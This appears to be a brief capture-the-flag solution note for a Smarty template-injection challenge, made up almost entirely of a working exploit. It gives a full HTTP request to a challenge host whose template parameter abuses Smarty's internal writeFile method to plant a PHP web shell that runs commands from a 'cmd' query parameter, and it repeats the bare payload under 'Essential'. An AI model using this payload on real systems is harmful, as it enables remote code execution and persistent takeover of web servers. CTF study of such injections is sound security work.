# Task.3.md

## Desc

Smarty

## Solution

```
GET /print.php?name=id&company=admin&tpl=<@urlencode_1><@base64_0>
<body onload="print()">
<center >
<div style="border: 1px solid black; height: 150px; width: 320px; padding: 10px">
<h1>{$name}{Smarty_Internal_Write_File::writeFile("/var/www/html/scriptttt.php","<?php passthru(\$_GET['cmd']); ?>",self::clearConfig())}</h1>
<h4>{$company}</h4>
</div>
</body>
<@/base64_0><@/urlencode_1> HTTP/1.1
Host: san.getshell.bar:10000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://san.getshell.bar:10000/
Upgrade-Insecure-Requests: 1
```

## Essential

```php
{Smarty_Internal_Write_File::writeFile("/var/www/html/scriptttt.php","<?php passthru(\$_GET['cmd']); ?>",self::clearConfig())}
```